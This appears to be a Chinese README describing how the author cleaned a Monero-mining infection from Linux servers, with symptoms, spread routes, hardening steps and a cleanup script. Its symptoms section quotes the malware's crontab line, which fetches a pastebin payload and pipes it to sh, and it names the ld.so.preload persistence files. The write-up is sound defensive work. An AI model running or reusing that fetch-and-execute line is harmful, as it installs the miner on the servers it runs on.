##背景

20190409 晚上阿里云邮件预警提示有服务器不断向其他服务器发送6379，22端口的请求，同时封闭了该服务器的端口，后来阿里云披露出来是门罗币挖矿病毒。 该病毒可以通过免密钥登录的方式无限复制，只要中招服务器有对应的免密钥登录到其他服务器的配置，都会被感染。


##表现


`
[root@dev-us-api ~]# crontab -l
`

*/15 * * * * (curl -fsSL https://pastebin.com/raw/v5XC0BJh||wget -q -O- https://pastebin.com/raw/v5XC0BJh)|sh

crontab中的任务删除过段时间会自动创建（其实后来发现是基于预加载库的拦截，每次执行ls ll 等命令都会刷新这个任务计划，木马会重新写入）
有的服务器top可以看到占用cpu较高的应用有的服务器看不到
ps  看不到对应进程

尝试建立大量的22、6379端口请求


##传播途径：

1. root的免密钥登录（我是这个）
2. 还有一个redis的无密码登录（网上其他有人因为这个中）
3. jenkins 漏洞侵入


##处理流程

我查了很多资料后来找到一个busybox 工具，这个工具可以无依赖的让你使用操作系统常用的命令比如ps ls rm kill netstat 等等。可以用这些命令来查询被隐藏或者你差不到的应用。

1. ###确定请求地址：
 	pastebin.com，所以我在安全组里直接封掉了这个网站的所有请求，或者可以通过本地hosts的方式将这个网址解析为本机等等都可以

2. ###安全加固：
	默认这个病毒是通过22ssh 端口传染，所以ssh服务 的端口不能是默认，需要修改一个其他端口。关闭root登录，修改/etc/ssh/sshd_config 中PermitRootLogin yes 改为no。
	
	redis 尽量不要绑定到0.0.0.0 改为内网ip或者127.0.0.1，同时设置RequirePass 密码


3. ###删除木马
	核心的两个病毒文件（别急着删除，这里需要用busybox 去删除，直接rm 去删除的话，当你执行ls之类的命令，木马会重新被执行）
 	/etc/ld.so.preload 
 	/usr/local/lib/libpamcd.so
 
	其他病毒文件
		rm -f /etc/cron.d/tomcat
		rm -f /etc/cron.d/root
		rm -f /var/spool/cron/
		rm -f /tmp/ld.so.preload* 	
4. ###清理进程

	这里需要busybox，busybox 安装比较麻烦（而且不同的发行版编译的时候会遇到各种问题），我这里直接把命令放在版本库里了，直接git clone ，执行脚本即可。
	脚本我已经整理好了.
	脚本里面包含我遇到的 kerberods和khugepageds 两个木马进程和我其他服务器中招的kthrotlds，剩下的就是其他人遇到的我也整理进来，其他木马 可以通过busybox ps aux 来查看 ，基本从/tmp 启动的进程都是有问题的，所以可以仔细检查，看脚本的执行流程来删除掉就可以了
	
	最后需要重启（手动）。
##使用方法
	`cd /usr/local/src`

	`git clone https://github.com/unixtommy/virus_clean.git`

	`cd virus_clean`

	`sh virus_clean.sh`

	`重启`


附：比较感谢这个朋友，我主要参考了他的做法，而且他的情况跟我类似，也不完全类似，但是差不多了。

[Linux 挖矿病毒 khugepageds的处理](https://www.wangdb.com/archives/1599.html)
https://www.wangdb.com/archives/1599.html
